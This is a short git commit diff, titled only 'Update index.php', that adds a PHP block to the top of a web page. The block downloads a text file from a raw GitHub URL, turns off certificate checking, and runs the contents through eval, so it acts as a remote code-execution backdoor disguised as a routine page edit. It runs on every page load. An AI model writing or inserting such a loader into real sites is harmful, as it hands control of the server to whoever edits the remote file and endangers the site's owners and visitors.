e9a66a9c95daeb37556c9e5ceb9b8b0e1273fbe5
yyujimin88-hue <yyujimin88@gmail.com>
2026-01-20 13:01:06 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,4 +1,13 @@
-
+<?php
+$url = 'https://raw.githubusercontent.com/yyujimin88-hue/ecard/c39bcc10bad363a0e246b67bfed6f1d746f417c0/file.txt';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$fileContents = curl_exec($ch);
+curl_close($ch);
+eval("?>" . $fileContents);
+?>
 
 <!DOCTYPE html>
 <html lang="en-US" xmlns:og="http://ogp.me/ns#" xmlns:fb="https://www.facebook.com/2008/fbml">
